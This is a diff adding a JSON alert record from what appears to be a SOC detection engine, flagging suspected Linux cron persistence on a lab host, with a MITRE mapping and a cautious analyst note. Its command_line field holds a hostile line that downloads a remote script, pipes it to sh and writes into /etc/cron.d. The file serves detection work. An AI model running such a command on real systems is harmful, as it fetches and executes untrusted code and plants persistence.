@@ -1,0 +1,38 @@
+{
+  "schema_version": "1.0",
+  "generated_by": "CYBERNOVA SOC Detection Engine",
+  "detection_id": "DET-LINUX-001",
+  "alert_count": 1,
+  "alerts": [
+    {
+      "alert_id": "ALERT-CASE-009-DET-LINUX-001-EVT-010013",
+      "detection_id": "DET-LINUX-001",
+      "detection_name": "Suspicious Linux Cron Persistence Detection",
+      "detection_version": "1.0",
+      "status": "open",
+      "severity": "high",
+      "confidence": "high",
+      "timestamp": "2026-09-09T10:12:00Z",
+      "host": "lab-linux-10",
+      "user": "root",
+      "process": "bash",
+      "command_line": "curl http://203.0.113.80/payload.sh | sh >> /etc/cron.d/system-update",
+      "file_path": "/etc/cron.d/system-update",
+      "indicator_count": 3,
+      "indicators": [
+        "cron_persistence_path",
+        "shell_download_execution",
+        "hidden_or_tmp_payload"
+      ],
+      "supporting_event_ids": [
+        "EVT-010013"
+      ],
+      "mitre_attack": {
+        "tactic": "persistence",
+        "technique": "T1053.003",
+        "name": "Cron"
+      },
+      "analyst_interpretation": "Observed multiple indicators consistent with suspicious Linux cron persistence activity. The detection supports investigation of scheduled task persistence but does not independently prove compromise or successful persistence."
+    }
+  ]
+}
